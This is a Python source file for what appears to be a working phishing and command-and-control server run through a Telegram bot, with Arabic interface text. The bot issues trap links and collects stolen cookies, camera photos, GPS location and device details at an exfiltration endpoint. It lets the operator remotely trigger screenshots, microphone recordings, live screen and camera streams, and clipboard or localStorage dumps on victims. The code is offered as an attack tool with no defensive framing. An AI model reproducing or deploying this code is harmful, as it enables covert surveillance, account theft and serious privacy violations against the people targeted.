import os
import uuid
import asyncio
import base64
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile

from config import BOT_TOKEN, DOMAIN, LINK_TO_USER, VICTIMS_DB, COMMAND_QUEUES
from templates import get_intel_template, get_live_template

app = FastAPI()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    geolocation: dict = {}
    stolen_cookies: str = ""
    stolen_data: dict = {}

class CommandResponse(BaseModel):
    link_id: str
    cmd: str
    data: str

@app.get("/intel/{link_id}", response_class=HTMLResponse)
async def serve_intel_trap(link_id: str):
    return HTMLResponse(content=get_intel_template(link_id))

@app.get("/live/{link_id}", response_class=HTMLResponse)
async def serve_live_trap(link_id: str):
    return HTMLResponse(content=get_live_template(link_id))

@app.get("/api/v1/poll-command/{link_id}")
async def poll_command(link_id: str):
    if link_id in COMMAND_QUEUES and COMMAND_QUEUES[link_id]:
        cmd = COMMAND_QUEUES[link_id].pop(0)
        return {"cmd": cmd}
    return {"cmd": None}

@app.post("/api/v1/c2-respond")
async def c2_respond(resp: CommandResponse):
    link_id = resp.link_id
    cmd_type = resp.cmd
    res_data = resp.data
    target_user_id = LINK_TO_USER.get(link_id)
    
    if not target_user_id:
        return {"status": "error"}

    try:
        if cmd_type == "screen_snapshot" and "," in str(res_data):
            _, encoded = res_data.split(",", 1)
            await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="screen_snap.jpg"), caption="📸 *لقطة شاشة تفصيلية لسطح مكتب الهدف*", parse_mode="Markdown")
        elif (cmd_type == "live_screen_frame" or cmd_type == "live_camera_frame") and "," in str(res_data):
            _, encoded = res_data.split(",", 1)
            title = "🔴 *تدفق البث الحي للشاشة*" if cmd_type == "live_screen_frame" else "📹 *تدفق البث الحي للكاميرا*"
            await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="stream_frame.jpg"), caption=title, parse_mode="Markdown")
        elif cmd_type == "audio_clip" and "," in str(res_data):
            _, encoded = res_data.split(",", 1)
            await bot.send_voice(chat_id=target_user_id, voice=BufferedInputFile(base64.b64decode(encoded), filename="audio_rec.ogg"), caption="🎤 *ملف التسجيل الصوتي المسحوب*", parse_mode="Markdown")
        else:
            await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة تنفيذ الأداة: {cmd_type}]*\n\n`{str(res_data)[:1200]}`", parse_mode="Markdown")
    except Exception as e:
        print(f"Delivery Error: {e}")
        
    return {"status": "ok"}

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    VICTIMS_DB[data.link_id].append(data.dict())
    
    target_user_id = LINK_TO_USER.get(data.link_id)
    if target_user_id:
        try:
            s_data = data.stolen_data
            geo = data.geolocation
            geo_text = f"Lat: {geo.get('lat')}, Lon: {geo.get('lon')}" if isinstance(geo, dict) and 'lat' in geo else "غير متاح أو مرفوض"
            
            caption = (
                "⚡ *[ اختراق ناجح واصطياد كامل للضحية! ]*\n\n"
                f"💻 *النظام المتصفح:* `{data.device_info[:80]}`\n"
                f"📐 *الشاشة الأساسية:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
                f"📍 *الموقع الجغرافي (GPS):* `{geo_text}`\n"
                f"🍪 *الكوكيز:* `{data.stolen_cookies[:60]}...`"
            )
            
            kb_control = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="🍪 سحب Cookies", callback_data=f"cmd_cookie_{data.link_id}"),
                    InlineKeyboardButton(text="📦 سحب LocalStorage", callback_data=f"cmd_ls_{data.link_id}")
                ],
                [
                    InlineKeyboardButton(text="📸 لقطة شاشة دقيقة", callback_data=f"cmd_snap_{data.link_id}"),
                    InlineKeyboardButton(text="🎤 تسجيل صوتي", callback_data=f"cmd_mic_{data.link_id}")
                ],
                [
                    InlineKeyboardButton(text="🔴 بث شاشة حي", callback_data=f"cmd_lscr_{data.link_id}"),
                    InlineKeyboardButton(text="⏹️ إيقاف البث", callback_data=f"cmd_stopscr_{data.link_id}")
                ],
                [
                    InlineKeyboardButton(text="📹 بث كاميرا حي", callback_data=f"cmd_lcam_{data.link_id}"),
                    InlineKeyboardButton(text="📋 سحب الحافظة", callback_data=f"cmd_clip_{data.link_id}")
                ]
            ])

            if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                _, encoded = data.camera_snapshot_base64.split(",", 1)
                await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="target_face.jpg"), caption=caption, parse_mode="Markdown", reply_markup=kb_control)
            else:
                await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown", reply_markup=kb_control)
        except Exception as e:
            print(f"Telegram Dispatch Error: {e}")
    return {"status": "success"}

@dp.callback_query(lambda c: c.data and c.data.startswith("cmd_"))
async def process_live_commands(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    action = parts[1]
    link_id = parts[2]
    
    cmd_mapping = {
        "cookie": "dump_cookies",
        "ls": "dump_localstorage",
        "snap": "screen_snapshot",
        "mic": "record_audio",
        "clip": "dump_clipboard",
        "lscr": "start_live_screen",
        "stopscr": "stop_live_screen",
        "lcam": "start_live_camera"
    }
    target_cmd = cmd_mapping.get(action)
    if not target_cmd:
        await callback.answer("❌ أمر استغلال غير معروف.", show_alert=True)
        return

    if link_id not in COMMAND_QUEUES:
        COMMAND_QUEUES[link_id] = []
    COMMAND_QUEUES[link_id].append(target_cmd)
    
    await callback.answer("🚀 تم إرسال الأمر بنجاح وجاري تنفيذه من جهاز الهدف!", show_alert=True)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔍 أداة الاستخبارات والتوثيق الأمني"), KeyboardButton(text="⚡ أداة التحكم العسكري C2 المشفر")],
            [KeyboardButton(text="📊 الإحصائيات العامة")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "💀 *منصة الترسانة السيبرانية العسكرية المتقدمة*\n\n"
        "• تم تفعيل نظام طوابير الأوامر المباشرة (HTTP Polling Engine).\n"
        "• اختر الأداة المطلوبة للبدء:",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "🔍 أداة الاستخبارات والتوثيق الأمني")
async def gen_intel_link(message: types.Message):
    token = str(uuid.uuid4())[:8]
    LINK_TO_USER[token] = message.from_user.id
    url = f"https://{DOMAIN}/intel/{token}"
    await message.answer(f"✅ *رابط الاستخبارات الأمني الجاهز:*\n\n`{url}`", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "⚡ أداة التحكم العسكري C2 المشفر")
async def gen_live_link(message: types.Message):
    token = str(uuid.uuid4())[:8]
    LINK_TO_USER[token] = message.from_user.id
    url = f"https://{DOMAIN}/live/{token}"
    await message.answer(f"✅ *رابط C2 العسكري الفوري:*\n\n`{url}`", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "📊 الإحصائيات العامة")
async def show_stats(message: types.Message):
    user_id = message.from_user.id
    user_links = [t for t, uid in LINK_TO_USER.items() if uid == user_id]
    total_victims = sum(len(VICTIMS_DB.get(t, [])) for t in user_links)
    await message.answer(f"📊 *إحصائيات ترسانتك:*\n\n🎯 إجمالي الضحايا: *{total_victims}*", parse_mode="Markdown")

async def run_polling():
    await dp.start_polling(bot)

@app.on_event("startup")
async def startup():
    asyncio.create_task(run_polling())

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
